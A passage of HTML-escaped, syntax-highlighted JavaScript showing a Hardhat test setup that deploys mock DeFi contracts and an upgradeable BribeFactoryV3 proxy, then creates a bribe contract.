class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Mock Token\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MTK\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock Voter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockVoter\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock GaugeManager\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockGaugeManager\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock TokenHandler\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockTokenHandler\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock VotingEscrow\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockVotingEscrow\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock Minter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockMinter\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set up mock Voter to return mock VE\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set up mock GaugeManager to return minter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set initial active period\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetActivePeriod\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efloor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk10\"\u003eDate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy BribeFactoryV3 as upgradeable\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBribeFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BribeFactoryV3\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupgrades\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployProxy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBribeFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ], { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitializer:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;initialize\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Create a bribe contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      